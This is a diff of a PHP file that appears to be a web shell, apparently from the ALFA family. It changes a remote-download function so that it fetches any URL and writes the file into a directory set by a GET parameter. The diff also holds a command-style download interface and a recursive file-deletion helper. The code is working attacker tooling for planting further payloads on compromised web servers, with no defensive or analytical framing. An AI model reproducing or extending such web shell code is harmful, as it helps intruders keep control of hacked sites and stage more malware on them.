@@ -58,26 +58,69 @@ return$t;}
 
 function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}
 
-function __download_secure($url,$optname=''){
-  $base=getcwd();if(!is_dir($base))return['ok'=>false,'err'=>'Invalid dir','path'=>null];
-  if(!filter_var($url,FILTER_VALIDATE_URL))return['ok'=>false,'err'=>'Invalid URL','path'=>null];
-  $basename=basename(parse_url($url,PHP_URL_PATH)??'file.bin');
-  $basename=preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
-  $filename=$optname?preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname)):$basename;
-  $target=rtrim($base,'/')."/".$filename;
-  $ok=false;$err='';
-  if(function_exists('curl_init')){
-    $ch=curl_init($url);$fp=@fopen($target,'w');
-    if($fp){curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>90]);
-      curl_exec($ch);$cerr=curl_error($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
-      curl_close($ch);fclose($fp);
-      if(!$cerr&&$code<400&&is_file($target))$ok=true;else{@unlink($target);$err=$cerr?:$code;}
-    }else $err='Write fail';
-  }
-  if(!$ok){$d=@file_get_contents($url);if($d!==false&&@file_put_contents($target,$d)!==false)$ok=true;else$err=$err?:'Download failed';}
-  if($ok)@chmod($target,0644);
-  return['ok'=>$ok,'err'=>$err,'path'=>$target];
+function __download_secure($url, $optname = '') {
+    // Direktori aktif (GET path) atau direktori skrip
+    $base = isset($_GET['path']) && is_dir($_GET['path']) ? $_GET['path'] : dirname(__FILE__);
+
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        return ['ok' => false, 'err' => 'Invalid URL', 'path' => null];
+    }
+
+    // Nama file aman
+    $basename = basename(parse_url($url, PHP_URL_PATH) ?? 'download.bin');
+    $basename = preg_replace('/[^A-Za-z0-9._-]/', '_', $basename);
+    $filename = $optname
+        ? preg_replace('/[^A-Za-z0-9._-]/', '_', basename($optname))
+        : $basename;
+
+    $target = rtrim($base, '/')."/".$filename;
+    $ok = false; $err = '';
+
+    // Gunakan cURL jika tersedia
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        $fp = @fopen($target, 'w');
+        if ($fp) {
+            curl_setopt_array($ch, [
+                CURLOPT_FILE => $fp,
+                CURLOPT_FOLLOWLOCATION => 1,
+                CURLOPT_TIMEOUT => 90,
+                CURLOPT_FAILONERROR => true,
+            ]);
+            curl_exec($ch);
+            $cerr = curl_error($ch);
+            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            fclose($fp);
+            if (!$cerr && $code < 400 && is_file($target)) {
+                $ok = true;
+            } else {
+                @unlink($target);
+                $err = $cerr ?: "HTTP $code";
+            }
+        } else {
+            $err = 'Write failed';
+        }
+    }
+
+    // Fallback tanpa cURL
+    if (!$ok) {
+        $data = @file_get_contents($url);
+        if ($data !== false && @file_put_contents($target, $data) !== false) {
+            $ok = true;
+        } else {
+            $err = $err ?: 'Download failed';
+        }
+    }
+
+    if ($ok) @chmod($target, 0644);
+
+    // Buat path relatif untuk tampilan (tanpa absolute dir)
+    $relative = str_replace(dirname(__FILE__), '.', realpath($target));
+
+    return ['ok' => $ok, 'err' => $err, 'path' => $relative];
 }
+
 
 function alfaremotedl(){
   echo"<div style='background:#0b0b10;padding:14px;border-radius:8px;margin:15px auto;max-width:950px;box-shadow:0 0 10px rgba(110,70,255,0.3);'>";
@@ -96,8 +139,9 @@ function alfaremotedl(){
       $p=preg_split('/\s+/',$cmd,3);
       if(count($p)<2||strtolower($p[0])!=='download')echo"<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
       else{$r=__download_secure($p[1],$p[2]??'');
-        echo $r['ok']?"<div style='color:#7f6'>Success: ".htmlspecialchars($r['path'])."</div>":"<div style='color:#f66'>Error: ".htmlspecialchars($r['err'])."</div>";}
-    }
+        echo $r['ok']
+    ? "<div style='color:#6f6'>✅ Success: <span style=\"color:#59d6ff\">".htmlspecialchars($r['path'])."</span></div>"
+    : "<div style='color:#f66'>❌ Error: ".htmlspecialchars($r['err'])."</div>";}
     echo"</div>";
   }
   echo"<div style='color:#888;font-size:12px;margin-top:8px;'>Current dir: ".htmlspecialchars(getcwd())."</div></div>";
